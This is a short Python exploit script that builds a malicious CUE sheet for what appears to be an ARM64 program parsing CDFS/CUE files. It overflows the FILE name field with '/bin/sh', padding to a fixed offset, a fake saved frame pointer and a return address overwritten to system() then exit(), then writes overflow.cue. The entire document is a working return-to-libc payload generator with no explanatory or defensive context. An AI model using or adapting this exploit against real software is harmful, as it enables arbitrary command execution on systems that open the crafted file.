#!/usr/bin/env python3
import struct

OFFSET = 6270

system_addr = 0xfffff7e3cec4
exit_addr   = 0xfffff7e2f2f0

# Our argument to system() — this stays in the string part of FILE ""
binsh = b"/bin/sh\x00"

# Build the FILE name content
name  = binsh
name += b"A" * (OFFSET - len(name))

# Fake saved x29
name += b"B" * 8

# Overwrite saved x30 → system()
name += struct.pack("<Q", system_addr)

# Next "return" → exit()
name += struct.pack("<Q", exit_addr)

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "' + name + b'" BINARY\n')
    f.write(b"  TRACK 01 MODE1/2352\n")
    f.write(b"    INDEX 01 00:00:00\n")

print("[+] Payload written to overflow.cue")
